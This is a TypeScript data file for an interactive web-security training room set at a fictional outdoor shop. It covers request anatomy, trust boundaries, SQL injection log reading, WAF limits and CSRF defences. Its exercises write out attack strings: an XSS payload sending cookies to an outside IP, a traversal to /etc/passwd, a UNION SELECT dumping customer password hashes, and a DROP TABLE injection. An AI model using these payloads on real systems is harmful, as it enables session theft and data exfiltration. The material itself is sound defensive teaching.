import type { RoomExperience } from "./types";

// "Operation Request Line" for the "web-application-security" room.
// Script: docs/campaign/20-web-application-security.md.
// Station task ids must match the room's task order exactly (see getRoomExperience).
//
// Fernhill Outdoor (fictional), not the graded tasks' Larkfield. Lab data
// differs from the graded tasks: the curl labs never show an IIS log or a POST
// body's absence from it (q1); the SQLi outcome sheet is a search endpoint, not
// la1's /download.aspx traversal, and never matches classes to tells (m1); the
// WAF sort leaves out IDOR (q2) and never compares client IPs (la2) or an
// apostrophe false positive (ac1); and the CSRF sheet reads cookie and token
// defences, not a forged change-email request (q3) or the request's life
// order (o1).
export const WEB_APPLICATION_SECURITY: RoomExperience = {
  roomId: "web-application-security",
  codename: "Operation Request Line",
  theme: "webapp",
  handler: { name: "Kai Morgan", role: "Application Security Engineer, Fernhill Outdoor" },
  briefing: [
    "Fernhill Outdoor. One online shop, 40,000 orders a month, and a request arriving every few milliseconds.",
    "Every web attack is someone putting something unexpected into a request. Kai Morgan wants you to see one up close before you ever investigate one.",
    "You'll send requests by hand, change what the browser 'allows', watch a SQL injection go from errors to success, and check which defences are switched on.",
    "Follow the request line from browser to database, and back.",
  ],
  mission: "Take a request apart with curl, tamper with a hidden field to prove nothing from the client can be trusted, read a SQL injection's outcome from status codes and byte counts, decide what a WAF can and can't catch, and check whether CSRF defences are actually on.",
  estimate: "~50 min",
  look: { primary: "#f472b6", secondary: "#22d3ee", warn: "#f43f5e" },
  scene: "webpath",
  layout: "stage",
  story: {
    intro: { title: "Every Attack Is a Request", src: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/web-application-security/requestline-intro-64c48e8e.mp4", poster: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/web-application-security/requestline-intro-b85f1026.jpg" },
    afterStation: {
      trust: { title: "The Lock Is Drawn on the Door", src: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/web-application-security/requestline-ch2-637934b4.mp4", poster: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/web-application-security/requestline-ch2-e6dee47d.jpg" },
      attacks: { title: "Errors, Then Success", src: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/web-application-security/requestline-ch3-a5979979.mp4", poster: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/web-application-security/requestline-ch3-db2636bc.jpg" },
      csrf: { title: "The Browser's Own Trust", src: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/web-application-security/requestline-finale-8a62d911.mp4", poster: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/web-application-security/requestline-finale-45e8ed37.jpg" },
    },
  },
  stations: [
    {
      id: "request",
      label: "Anatomy of a Request",
      topic: "Method, path, query string, headers, cookies, body · the response and its status",
      tagline: "Send a request by hand and read every part of it",
      building: "archive",
      taskIds: ["webapp-r1"],
    },
    {
      id: "trust",
      label: "Trust Nothing",
      topic: "The trust boundary · hidden fields, dropdowns and client-side checks",
      tagline: "Change what the page says you can't, and see what the server accepts",
      building: "vault",
      taskIds: ["webapp-r2", "webapp-q1"],
    },
    {
      id: "attacks",
      label: "Where Attacks Land",
      topic: "SQLi, XSS, traversal, command injection, session attacks, IDOR · OWASP Top 10 2021",
      tagline: "Read an injection's outcome in the status codes",
      building: "lab",
      taskIds: ["webapp-r3", "webapp-m1", "webapp-la1"],
    },
    {
      id: "waf",
      label: "The WAF's View",
      topic: "Signatures and anomaly scoring · what a WAF misses · X-Forwarded-For",
      tagline: "Decide what a WAF can and can't stop",
      building: "control",
      taskIds: ["webapp-r4", "webapp-q2", "webapp-la2", "webapp-ac1"],
    },
    {
      id: "csrf",
      label: "Forged Requests",
      topic: "CSRF: the browser's own trust as the weapon · SameSite and anti-CSRF tokens",
      tagline: "Check which forms are protected",
      building: "ticket",
      taskIds: ["webapp-r5", "webapp-q3", "webapp-o1"],
      boss: true,
    },
  ],
  personas: {
    "webapp-q1": { name: "Kai Morgan", role: "Application Security Engineer", line: "SQL in a login form's POST body. What does the IIS access log show for that second?" },
    "webapp-q2": { name: "Kai Morgan", role: "Application Security Engineer", line: "Someone changed an invoice ID in the URL and got another customer's invoice. Why didn't the WAF stop it?" },
    "webapp-q3": { name: "Kai Morgan", role: "Application Security Engineer", line: "A change-email POST with a Referer from a raffle site. Which attack is it?" },
    "webapp-ac1": { name: "Kai Morgan", role: "Application Security Engineer", line: "The WAF blocked a staff lookup for an SQL pattern. Attack, or something else?" },
  },
  briefings: {
    // ── Reading 1: what a request is ──
    "webapp-r1": [
      {
        kind: "codebreak",
        title: "Name the Part of the Request",
        prompt: "Kai reads Fernhill's access log aloud, one clue at a time. Name the part of the request or the response he is pointing at.",
        tries: 6,
        rounds: [
          { id: "method", clue: "The first word of the request line. It sends a login form's data in the body, so the password never shows in the URL or the query string.", answer: "POST", why: "POST carries data in the body; GET puts it in the URL. A body is not recorded in a typical web server access log, which only keeps the request line and the status." },
          { id: "cookie", clue: "The request header the browser sends back on every request, holding fh_session. Whoever presents it is treated as logged in.", answer: "COOKIE", why: "The server issued the session value in a Set-Cookie response header, and the browser returns it in the Cookie header. A stolen value is a stolen session." },
          { id: "forbidden", clue: "Status code for a logged-in customer asking for another customer's invoice page. The server understood the request and refuses it.", answer: "403", why: "4xx means the client asked for something wrong. 403 is a refusal after login, unlike 401 which means authentication is missing or failed. A burst of 403s from one account is worth a look." },
          { id: "broke", clue: "Status code when the server itself fails while handling a request, for example when a stray quote in the search box breaks the SQL query.", answer: "500", why: "5xx means the server broke. A 500 followed by a normal 200 on the same endpoint is the pattern of someone probing for injection." },
        ],
        lesson: "A request is a method, a path with a query string, headers (including the cookie), and sometimes a body. The status class tells you who is at fault: 4xx the client, 5xx the server.",
      },
    ],
    // ── Reading 2: the trust boundary ──
    "webapp-r2": [
      {
        kind: "pathway",
        title: "Where Could This Have Been Stopped?",
        prompt: "The basket form has a hidden price field and a quantity dropdown limited to 1-5, and the page script checks both. Someone sent the basket request by hand with price=0.01 and qty=500. Follow it to the one place that could have refused it.",
        goal: "Walk the hand-sent request to the database and find where the real check belongs.",
        nodes: [
          { id: "hand", label: "Hand-sent request", sub: "no browser", x: 12, y: 50 },
          { id: "js", label: "Page script", sub: "client-side checks", x: 30, y: 18 },
          { id: "cdn", label: "CDN", sub: "edge", x: 32, y: 60 },
          { id: "waf", label: "WAF", sub: "pattern rules", x: 52, y: 30 },
          { id: "lb", label: "Load balancer", sub: "routes traffic", x: 68, y: 58 },
          { id: "logs", label: "Access log", sub: "request line only", x: 52, y: 82 },
          { id: "app", label: "App server", sub: "basket logic", x: 88, y: 30 },
          { id: "db", label: "Orders database", sub: "stores the order", x: 88, y: 78 },
        ],
        edges: [
          ["hand", "cdn"],
          ["hand", "js"],
          ["cdn", "waf"],
          ["waf", "lb"],
          ["lb", "app"],
          ["app", "db"],
          ["waf", "logs"],
          ["lb", "logs"],
        ],
        route: ["hand", "cdn", "waf", "lb", "app", "db"],
        notes: {
          hand: "Built by hand, so the dropdown and hidden field of the browser were never involved. Whatever is typed is what travels: price, quantity, anything.",
          cdn: "Static files are cached here; a POST goes straight through to the origin. It does not judge what the body says.",
          waf: "The request is perfectly well formed: price=0.01 and qty=500 match no attack signature. A WAF cannot know that the price should be 89.00.",
          lb: "Hands the request to one app server and adds the client address in X-Forwarded-For. It routes, it does not know the shop's rules.",
          app: "This is the lock. The server must look up the price in its own catalog and cap the quantity itself, never trust the posted values. If it does, the request is refused here.",
          db: "The database stores what the app gives it. If the app trusted the posted price, an order for 500 stoves at 0.01 is written down as valid.",
        },
        traps: {
          js: "The script only runs inside a browser. A hand-sent request never loads the page, so its checks are skipped. Client-side validation is a convenience, not a lock.",
          logs: "The access log records the request line and the status after the fact. It is not on the path, and a POST body is not in it.",
        },
        lesson: "Everything that comes from the client can be changed. A WAF can only match patterns, and a script only helps honest users, so prices, limits and permissions must be enforced by the server from its own data.",
      },
    ],
    // ── Reading 3: attack classes ──
    "webapp-r3": [
      {
        kind: "worksheet",
        title: "Errors, Then Success",
        prompt: "Fernhill's search endpoint, one client, five minutes. Normal responses are 3-6 KB. Read the outcome column the way Reading 3 taught.",
        caption: "Access log extract · GET /search · client 203.0.113.58",
        columns: ["time", "q (decoded)", "status", "bytes"],
        rows: [
          ["10:02:11", "tent", "200", "4,812"],
          ["10:02:40", "tent'", "500", "1,206"],
          ["10:03:02", "tent' ORDER BY 9--", "500", "1,206"],
          ["10:03:31", "tent' ORDER BY 6--", "200", "4,790"],
          ["10:04:15", "x' UNION SELECT email,pwd_hash,3,4,5,6 FROM customers--", "200", "2,914,507"],
        ],
        questions: [
          { id: "probe", q: "What did the single quote at 10:02:40 do?", hint: "Look at its status.", answer: ["broke the query", "error", "500", "caused an error", "syntax error"], why: "A stray quote broke the SQL syntax and the database threw: proof the input reaches a query unescaped." },
          { id: "cols", q: "How many columns does the query have? (ORDER BY 9 fails, ORDER BY 6 works)", hint: "The largest ORDER BY that returns 200.", answer: ["6", "six"], why: "Attackers find the column count first, so their UNION lines up." },
          { id: "win", q: "At what time did the injection succeed?", hint: "A 200 with a size unlike the endpoint's normal output.", answer: ["10:04:15"], why: "2.9 MB from an endpoint that returns 5 KB: the customers table came back in the page." },
        ],
      },
    ],
    // ── Reading 4: the WAF ──
    "webapp-r4": [
      {
        kind: "sort",
        title: "Can the WAF See It?",
        prompt: "A WAF reads requests for bad patterns. Some attacks have a pattern; some are perfectly normal requests used for the wrong purpose.",
        buckets: [
          { id: "yes", label: "A WAF rule can catch it" },
          { id: "no", label: "Nothing for a WAF to match" },
        ],
        items: [
          { id: "a", text: "?q=<script>document.location='//198.51.100.7/'+document.cookie</script>", bucket: "yes", why: "Script tags in a parameter: exactly what XSS rules look for." },
          { id: "b", text: "?file=..%2f..%2f..%2fetc%2fpasswd", bucket: "yes", why: "Encoded dot-dot-slash: traversal rules decode before matching." },
          { id: "c", text: "Valid username and password from a breach list, one try per account per hour", bucket: "no", why: "Each request is a normal login. Only rate and breach-list correlation reveal it." },
          { id: "d", text: "One discount code applied 40 times to one order", bucket: "no", why: "Business-logic abuse: every request is well-formed. The fix is in the application." },
          { id: "e", text: "A stolen session cookie replayed from a new IP", bucket: "no", why: "The cookie is genuine. Nothing in the request is malformed." },
          { id: "f", text: "{\"name\":\"a'; DROP TABLE orders;--\"} in a 1 KB JSON body", bucket: "yes", why: "SQL syntax in a small body: well within what managed SQLi rules inspect." },
        ],
      },
    ],
    // ── Reading 5: CSRF ──
    "webapp-r5": [
      {
        kind: "worksheet",
        title: "Are the Defences On?",
        prompt: "Kai pulled the response headers and form markup for three state-changing pages on Fernhill's account portal. A page is protected if its session cookie is SameSite=Lax or Strict, or its form carries an anti-CSRF token the server checks.",
        caption: "account.fernhill.example · response headers and forms",
        columns: ["page", "session cookie", "form token", "server checks token"],
        rows: [
          ["/account/address", "fh_session=...; Secure; HttpOnly; SameSite=Lax", "yes", "yes"],
          ["/account/payout-bank", "fh_session=...; Secure; HttpOnly; SameSite=None", "no", "n/a"],
          ["/account/newsletter", "fh_session=...; Secure; HttpOnly; SameSite=None", "yes", "no (token ignored)"],
        ],
        questions: [
          { id: "worst", q: "Which page could another website make a logged-in user's browser submit, with real money at stake?", hint: "No SameSite protection and no token.", answer: ["/account/payout-bank", "payout-bank", "payout"], why: "SameSite=None sends the cookie on cross-site requests, and there's no token. A hidden form on any page could change where payouts go." },
          { id: "fake", q: "Which page has a token that protects nothing?", hint: "Read the last column.", answer: ["/account/newsletter", "newsletter"], why: "A token the server never checks is decoration. Defences have to be verified server-side." },
          { id: "attr", q: "Which cookie attribute stops the browser sending the session on most cross-site requests?", hint: "Strict or Lax.", answer: ["SameSite", "samesite=lax", "samesite=strict"], why: "SameSite=Lax blocks the cookie on cross-site POSTs, the usual CSRF vehicle." },
        ],
      },
    ],
  },
};
